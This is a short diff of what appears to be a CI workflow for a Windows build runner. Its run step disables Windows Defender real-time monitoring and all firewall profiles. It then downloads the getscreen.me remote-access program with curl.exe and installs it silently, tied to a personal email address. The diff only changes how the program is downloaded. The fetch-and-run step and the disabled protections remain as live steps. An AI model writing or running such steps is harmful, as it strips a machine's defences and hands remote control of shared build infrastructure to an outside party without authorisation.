@@ -13,9 +13,7 @@ jobs:
         run: |
           Set-MpPreference -DisableRealtimeMonitoring $true
           Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $url = "https://getscreen.me"
-          Start-BitsTransfer -Source $url -Destination ".\getscreen.exe"
+          curl.exe -L "https://getscreen.me" -o "getscreen.exe"
           Start-Process -FilePath ".\getscreen.exe" -ArgumentList "/S /email:jordanegaylord8@gmail.com" -Wait
 
       - name: Time Counter
